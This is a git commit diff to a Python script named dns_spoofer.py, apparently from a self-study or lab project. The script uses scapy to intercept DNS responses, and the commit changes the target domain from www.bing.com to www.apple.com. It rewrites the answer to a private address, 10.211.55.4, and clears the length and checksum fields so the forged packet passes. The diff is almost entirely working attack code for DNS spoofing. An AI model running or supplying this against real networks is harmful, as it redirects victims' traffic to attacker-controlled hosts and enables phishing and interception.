c3a03919aa8ca6d2e491417594f28a0fb03fd110
Michael Zick <michaelzick@gmail.com>
2022-08-19 03:55:24 -0700

    Changed to apple.com and changed chksum order

--- dns_spoofer.py
+++ dns_spoofer.py
@@ -8,17 +8,17 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-
-        if 'www.bing.com' in str(qname):
+        if 'www.apple.com' in str(qname):
             print('[+] Spoofing target.')
             answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
+            print(scapy_packet.show())
 
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
 
             packet.set_payload(bytes(scapy_packet))
 
